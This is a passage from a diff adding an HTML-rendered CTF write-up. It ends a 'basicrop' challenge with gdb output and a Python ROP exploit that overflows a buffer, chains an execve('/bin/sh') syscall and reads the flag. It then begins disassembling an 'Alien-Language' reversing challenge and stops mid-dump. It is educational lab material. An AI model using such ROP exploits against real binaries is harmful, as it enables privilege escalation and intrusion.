+   &lt;span class=&quot;mh&quot;&gt;0x000000000040010a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040010e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040010f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400110&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400111&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First, this function move a value in RDI register. It seems to contain the “shell” address we’ve saw in the “nm” output. Lets display it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./basicrop &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
+Reading symbols from ./basicrop...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;br _start
+Breakpoint 1 at 0x4000b0
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r
+...
+Breakpoint 1, 0x00000000004000b0 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;_start &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/s 0x600114
+0x600114:	&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice, thanks to this string, we can easily execute a shell! So the “fuckit” function is very easy. It move the strings “/bin/sh” into the RDI register, then push 0x0 and RDI on the stack, then move RSP into RSI, then load the address of RSI+0x8 (so RSP+0x8) and then pop 3 times a value into RAX. Our goal will be to do an “execve” syscall with the good argument/syscall number. Our register will look like that:&lt;/p&gt;
+
+&lt;p&gt;RAX = 0x3b (59)
+RDI = “/bin/sh”
+RSI = “/bin/sh”
+RDX = 0x0&lt;/p&gt;
+
+&lt;p&gt;RDI/RSI/RDX are set to the good value but we have to set RAX. In the “fuckit” function we can see 3 “pop”. The first and the second one will pop the RDI value and 0x0, the two value pushed just before. But we can control the last one so we will add the value 0x3b (59) on the stack to poped it in RAX. Then we need to do the syscall. To do it we will jump into one of the two syscall instructions in the “breakme” function. I choose the first one.&lt;/p&gt;
+
+&lt;p&gt;The exploit will look like that:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fuckit_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004000fa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	 &lt;span class=&quot;c&quot;&gt;# Fuckit function address&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;			            &lt;span class=&quot;c&quot;&gt;# Execve syscall number&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;syscall_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004000dd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# Syscall instruction address&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;						               &lt;span class=&quot;c&quot;&gt;# Padding before overflow&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fuckit_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syscall_addr&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then we test it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python /tmp/dagger/basicrop.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;|./basicrop 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;�@id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1308&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic_rop-solved&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1307&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic_rop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1307&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic_rop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tocttou&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1305&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot_cop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1306&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2befree&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1311&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;botoxedstring&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1312&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fakemalware-killswitch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
+flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;r0ppin9_Y0ur_waY_t0_h3aveN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+&lt;h1 id=&quot;3-alien-language&quot;&gt;3. Alien-Language&lt;/h1&gt;
+&lt;p&gt;This challenge was in the cryptographic category but, for me, it was mostly a reversing challenge than cryptographic. (Maybe there was an other method to solve it…)&lt;/p&gt;
+
+&lt;p&gt;This challenge was made with an elf-64 binary. So we began by examining it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file alien 
+alien: ELF 64-bit LSB shared object, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a87da1012726ca02b0c683891ff6b35620b32e42, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; alien 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 meffre_q meffre_q 8.4K Sep 21 21:05 alien
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nm alien 
+0000000000201048 B __bss_start
+0000000000201048 b completed.6973
+                 w __cxa_finalize@@GLIBC_2.2.5
+0000000000201038 D __data_start
+0000000000201038 W data_start
+0000000000000670 t deregister_tm_clones
+0000000000000700 t __do_global_dtors_aux
+0000000000200de8 t __do_global_dtors_aux_fini_array_entry
+0000000000201040 D __dso_handle
+0000000000200df0 d _DYNAMIC
+0000000000201048 D _edata
+0000000000201050 B _end
+0000000000000b04 T _fini
+0000000000000740 t frame_dummy
+0000000000200de0 t __frame_dummy_init_array_entry
+0000000000000cec r __FRAME_END__
+0000000000201000 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+0000000000000ba0 r __GNU_EH_FRAME_HDR
+00000000000005d0 T _init
+0000000000200de8 t __init_array_end
+0000000000200de0 t __init_array_start
+0000000000000b10 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000000b00 T __libc_csu_fini
+0000000000000a90 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+000000000000091f T main
+000000000000074a T my_open
+                 U &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@@GLIBC_2.2.5
+00000000000006b0 t register_tm_clones
+                 U __stack_chk_fail@@GLIBC_2.4
+0000000000000640 T _start
+                 U strlen@@GLIBC_2.2.5
+0000000000201048 D __TMC_END__
+                 U write@@GLIBC_2.2.5
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./alien 
+337778877772337778
+Relaunch with the solution &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;argument.
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./alien toto 
+Too bad
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing very interesting, the “strings” command didn’t give use much more informations. So let’s begin the reverse engineering!&lt;/p&gt;
+
+&lt;p&gt;The main function look like that:&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alien&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Reading&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alien&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000091f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000920&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000923&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000927&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000092a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000092e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000932&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x960&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000934&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000939&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x202&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb42&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000940&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000945&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000094a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000094f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x202&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb58&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000956&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000095b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
